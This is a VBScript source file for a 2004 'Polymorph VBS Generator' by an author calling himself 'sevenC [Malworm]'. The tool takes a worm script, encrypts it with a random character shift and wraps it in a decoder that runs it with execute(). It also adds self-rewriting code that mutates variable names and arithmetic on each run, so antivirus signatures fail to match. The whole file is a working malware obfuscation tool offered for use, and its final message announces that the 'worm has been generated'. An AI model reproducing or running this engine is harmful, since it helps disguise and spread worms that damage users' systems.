'_____________sevenC Polymorph VBS Generator version 1.0_______________
'   _______   _______   _       _   _______       ____   ____  _______
'  / ____ \\ / ____ \\ /\\     /\\ / ____ \\     /   \\ /  // / ____ \\
' / //___\// \ \\_ \// \ \\   / // \ \\_ \//    /  /\ \/  // / //   \//
' \______ \\ / __//     \ \\ / //  / __//      /  // \   //  \ \\   _
' /\\___/ // \ \\__/\\   \ \/ //   \ \\__/\\  /  //  /  //    \ \\__/\\
' \______//   \_____//    \__//     \_____// /__//  /__//      \_____//
'________________________http://trax.to/sevenC__________________________
'________________________sevenC_zone@yahoo.com__________________________
'heyyy.... I see you again here...!!
'Yup, this is my new poly engine which gonna generate your VBS with many 
'polymorph & encryption technique.
'after my vVBS.Polysev & SSE-05 Released I think I should write this poly engine.
'
'You can see the explaination in SPVEG.txt
'And one thing, This is Not virus !! it's a sevenC Polymorphic VBS Generator 
'
'Ok Bye..!!
'
'sevenC [Malworm]
'http://sevenc.vze.com : http://trax.to/sevenC
'sevenC_zone@yahoo.com
'Copyleft(c)2004 By N0:7 LAB
'Created on May 9th 2004-Bekasi-Indonesia
'
'-------------------------- SPVG Poly engine -----------------------------
On error resume next
loc = inputbox("Where is your file location ?","SVPG 1.0","Example C:\My documents\worm.vbs")
sav = inputbox("Where is your generated file gonna be save","SVPG 1.0","Example C:\Polyworm.vbs")
Set Fso = CreateObject("scripting.FileSystemObject")
Randomize
for w = 1 to int(rnd * 9) + int(rnd * 43) + 1
Randomize
poly1 = (Int(Rnd * 27) + 1) + (Int(Rnd * 31)+ 1)
Randomize
Poly3 = Int(rnd * 9)+1
Randomize
poly2 = poly2 + poly1 - poly3
next
Randomize
polystr = Int(Rnd * 10) + 1
If polystr = 1 Then pol = "((" & poly1 & "/" & poly1 & ")+(100*2)/(20*5))+((" & poly2 & "*1/" & poly2 & ")-1)"
If polystr = 2 Then pol = "((" & poly1 & "/" & poly1 & ")+(1000*2)/(200*5))+((" & poly2 & "*2/" & poly2 & ")-2)"
If polystr = 3 Then pol = "((" & poly1 & "/" & poly1 & ")+(10*2)/(2*5))+((" & poly2 & "*3/" & poly2 & ")-3)"
If polystr = 4 Then pol = "((" & poly1 & "/" & poly1 & ")+(10^2)/(24+26))+((" & poly2 & "*4/" & poly2 & ")-4)"
If polystr = 5 Then pol = "((" & poly1 & "/" & poly1 & ")+(4*4)/(4+4))+((" & poly2 & "*5/" & poly2 & ")-5)"
If polystr = 6 Then pol = "((" & poly1 & "/" & poly1 & ")+(100*3)/(50*3))+((" & poly2 & "*6/" & poly2 & ")-6)"
If polystr = 7 Then pol = "((" & poly1 & "/" & poly1 & ")+(10+2)/(13-7))+((" & poly2 & "*7/" & poly2 & ")-7)"
If polystr = 8 Then pol = "((" & poly1 & "/" & poly1 & ")+(100*2)/(10*10))+((" & poly2 & "*8/" & poly2 & ")-8)"
If polystr = 9 Then pol = "((" & poly1 & "/" & poly1 & ")+(100*4)/(20*10))+((" & poly2 & "*9/" & poly2 & ")-2)"
If polystr = 10 Then pol = "((" & poly1 & "/" & poly1 & ")+(100*5)/(20*5+150))+((" & poly2 & "*10/" & poly2 & ")-10)"
Randomize
polyint = Int(Rnd * 10)
If polyint = 1 Then poly = ((10/10)+(100*2)/(20*5))+((10*1/10)-1)
If polyint = 2 Then poly = ((100/100)+(1000*2)/(200*5))+((100*2/100)-2)
If polyint = 3 Then poly = ((1000/1000)+(10*2)/(2*5))+((1000*3/1000)-3)
If polyint = 4 Then poly = ((10000/10000)+(10^2)/(24+26))+((10000*4/10000)-4)
If polyint = 5 Then poly = ((100000/100000)+(4*4)/(4+4))+((100000*5/100000)-5)
If polyint = 6 Then poly = ((1000000/1000000)+(100*3)/(50*3))+((1000000*6/1000000)-6)
If polyint = 7 Then poly = ((100000/100000)+(10+2)/(13-7))+((100000*7/100000)-7)
If polyint = 8 Then poly = ((10000/10000)+(100*2)/(10*10))+((10000*8/10000)-8)
If polyint = 9 Then poly = ((1000/1000)+(100*4)/(20*10))+((1000*9/1000)-2)
If polyint = 0 Then poly = ((100/100)+(100*5)/(20*5+150))+((100*10/100)-10)
If polyint = 10 Then poly =((10/10)+(100*5)/(20*5+150))+((10*11/10)-11)
set t = fso.Opentextfile(loc)
w = t.readall
v = replace(w,vbcrlf,":")
t.close
for i = 1 to len(v)
a = mid(v,i,1)
y = asc(a) + poly
u = chr(y)
d = d + u
next
st = strreverse(d)
set g = fso.createtextfile(sav)
g.write "a1 = " & chr(34) & d & chr(34) & vbcrlf
g.write "for i1 = 1 to len(a1):u1 = mid(a1,i1,1):e1 = asc(u1) - " & pol & " : k1 = chr(e1):j1 = j1 + k1:next:"
g.writeline "Randomize:KS892 = int(rnd*255)+1:if KS892 = 1000 then:for z1 = 0 to KS892:s1 = strreverse(j1):next:end if:execute(j1)"
g.writeline "set fso=createobject(" & chr(34) & "scripting.filesystemobject" & chr(34) & "):set lookback=fso.opentextfile(wscript.scriptfullname,1,false)"
g.writeline "poly = lookback.readall"
g.writeline "Randomize:polyint = Int(Rnd * 9):if polyint > 2 then:polynew = replace(poly," & chr(34) & pol & chr(34) & "," & chr(34) & pol & "*" & chr(34) & "&polyint/polyint):else:polynew = replace(poly," & chr(34) & pol & chr(34) & ",chr(51)&chr(42)&chr(54)&chr(49)&chr(50)&chr(47)&chr(54)&chr(49)&chr(50)):end if"
g.writeline "Randomize:polyint1 = Int(Rnd * 9):if polyint > 2 then:polynew2 = replace(polynew," & chr(34) & "polysev" & chr(34) & "," & chr(34) & "polysev & " & chr(34) & " & polyint1):else:polynew2 = replace (polynew," & chr(34) & "polysev" & chr(34) & ",chr(112)&chr(111)&chr(108)&chr(121)&chr(115)&chr(101)&chr(118)):end if"
g.writeline "Randomize:polyint2 = Int(Rnd * 9):if polyint > 2 then:polynew3 = replace(polynew2," & chr(34) & "a1" & chr(34) & "," & chr(34) & "a1" & chr(34) & "&polyint2):else:polynew3 = replace(poly," & chr(34) & "a1" & chr(34) & ",chr(97)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint3 = Int(Rnd * 9):if polyint > 2 then:polynew4 = replace(polynew3," & chr(34) & "i1" & chr(34) & "," & chr(34) & "i1" & chr(34) & "&polyint3):else:polynew4 = replace(poly," & chr(34) & "i1" & chr(34) & ",chr(105)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint4 = Int(Rnd * 9):if polyint > 2 then:polynew5 = replace(polynew4," & chr(34) & "u1" & chr(34) & "," & chr(34) & "u1" & chr(34) & "&polyint4):else:polynew5 = replace(poly," & chr(34) & "u1" & chr(34) & ",chr(117)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint5 = Int(Rnd * 9):if polyint > 2 then:polynew6 = replace(polynew5," & chr(34) & "e1" & chr(34) & "," & chr(34) & "e1" & chr(34) & "&polyint5):else:polynew6 = replace(poly," & chr(34) & "e1" & chr(34) & ",chr(101)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint6 = Int(Rnd * 9):if polyint > 2 then:polynew7 = replace(polynew6," & chr(34) & "k1" & chr(34) & "," & chr(34) & "k1" & chr(34) & "&polyint6):else:polynew7 = replace(poly," & chr(34) & "k1" & chr(34) & ",chr(107)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint7 = Int(Rnd * 9):if polyint > 2 then:polynew8 = replace(polynew7," & chr(34) & "j1" & chr(34) & "," & chr(34) & "j1" & chr(34) & "&polyint7):else:polynew8 = replace(poly," & chr(34) & "j1" & chr(34) & ",chr(106)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint8 = Int(Rnd * 9):if polyint > 2 then:polynew9 = replace(polynew8," & chr(34) & "b1" & chr(34) & "," & chr(34) & "b1" & chr(34) & "&polyint8):else:polynew9 = replace(poly," & chr(34) & "b1" & chr(34) & ",chr(98)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "Randomize:polyint9 = Int(Rnd * 9):if polyint > 2 then:polynew10 = replace(polynew9," & chr(34) & "z1" & chr(34) & "," & chr(34) & "z1" & chr(34) & "&polyint9):else:polynew10 = replace(poly," & chr(34) & "z1" & chr(34) & ",chr(122)&"& chr(34) & "1" & chr(34) & "):end if"
g.writeline "set newfile=fso.opentextfile(wscript.scriptfullname,2,false):newfile.write polynew10"
g.close
msgbox "Your worm has been generated...!!" & vbcrlf & "Saved as : " & sav ,VBInformation,"SPVG 1.0 By sevenC"
